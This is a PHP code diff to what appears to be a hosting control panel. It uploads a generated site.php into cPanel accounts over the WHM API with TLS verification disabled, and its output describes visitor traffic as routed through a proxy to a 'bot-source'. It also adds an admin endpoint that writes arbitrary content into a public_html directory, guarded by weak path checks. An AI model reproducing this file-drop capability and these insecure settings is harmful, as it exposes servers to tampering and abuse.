@@ -1105,15 +1105,15 @@ try {
                 $site_php_src
             );
 
-            // ── 4. Upload site.php to cPanel public_html ─────────────────────────────
-            // Use WHM Fileman API2 savefile (known to work)
+            // ── 4. Upload site.php to cPanel public_html via WHM API2 savefile ────────
             $w = $CONFIG['whm'];
             $savefile_body = http_build_query([
                 'cpanel_jsonapi_user'    => $cu,
                 'cpanel_jsonapi_module'  => 'Fileman',
                 'cpanel_jsonapi_func'    => 'savefile',
                 'cpanel_jsonapi_version' => '2',
-                'filename'               => '/public_html/site.php',
+                'dir'                    => '/public_html',
+                'filename'               => 'site.php',
                 'content'                => $site_php_final,
             ]);
             $save_ctx = stream_context_create(['http' => [
@@ -1122,18 +1122,14 @@ try {
                 'content' => $savefile_body,
                 'timeout' => 30,
             ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
-            $save_raw  = @file_get_contents("https://{$w['host']}:2086/execute/Fileman/save_file_content", false, $save_ctx);
+            $save_raw  = @file_get_contents("https://{$w['host']}:2087/json-api/cpanel", false, $save_ctx);
             $save_resp = json_decode($save_raw ?? '{}', true) ?: [];
+            $save_ok   = !empty($save_resp['cpanelresult']['data'][0]['path']);
 
-            // Fallback: try the WHM UAPI v3 path
-            if (!($save_resp['status'] ?? 0)) {
-                $r2 = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
-                    ['dir' => '/public_html', 'file' => 'site.php', 'content' => $site_php_final]);
-                if (!($r2['status'] ?? 0)) {
-                    json_out(['ok' => false, 'error' => 'Could not write site.php to cPanel: ' .
-                        ($r2['errors'][0] ?? $save_resp['errors'][0] ?? 'unknown')]);
-                    break;
-                }
+            if (!$save_ok) {
+                json_out(['ok' => false, 'error' => 'Could not write site.php to cPanel: ' .
+                    ($save_resp['cpanelresult']['error'] ?? 'unknown')]);
+                break;
             }
 
             json_out([
@@ -1144,6 +1140,31 @@ try {
                 'site_id'     => $domain,
                 'note'        => 'Visitor traffic: ' . $domain . '/site.php → proxy.php → bot-source',
             ]);
+
+        // ── Admin: write a file on THIS server (panelcou1999) ────────────────────
+        case 'admin_write_file':
+            require_admin();
+            $path    = $input['path']    ?? '';
+            $content = $input['content'] ?? '';
+            // Restrict to safe directories only
+            $allowed_roots = [
+                '/home/panelcou1999/public_html/',
+            ];
+            $real = realpath(dirname($path));
+            $ok_path = false;
+            foreach ($allowed_roots as $root) {
+                if (strpos($path, $root) === 0) { $ok_path = true; break; }
+            }
+            if (!$ok_path || strpos($path, '..') !== false) {
+                json_out(['ok' => false, 'error' => 'Path not allowed']);
+            }
+            $dir = dirname($path);
+            if (!is_dir($dir)) @mkdir($dir, 0755, true);
+            $bytes = file_put_contents($path, $content);
+            if ($bytes === false) {
+                json_out(['ok' => false, 'error' => 'Write failed: ' . $path]);
+            }
+            json_out(['ok' => true, 'path' => $path, 'bytes' => $bytes]);
 
         default:
             json_out(['ok' => false, 'error' => 'unknown action'], 404);
